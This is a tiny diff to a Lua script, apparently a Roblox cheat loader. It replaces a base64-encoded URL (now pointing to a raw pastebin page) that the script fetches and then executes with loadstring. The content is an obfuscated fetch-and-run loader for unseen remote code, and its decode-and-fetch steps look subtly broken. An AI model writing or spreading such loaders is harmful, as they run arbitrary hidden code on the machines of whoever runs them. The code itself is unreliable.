@@ -1,3 +1,3 @@
-local encodedURL = "aHR0cHM6Ly9zaG9ydGVyLm1lL0JhbkhhbW1lckdvYXQ="
+local encodedURL = "aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3LzJSS1dHdHA3"
 local decodedURL = game:HttpGet("data:text/plain;base64," .. encodedURL)
-loadstring(decodedURL)()
+loadstring(decodedURL, true)()
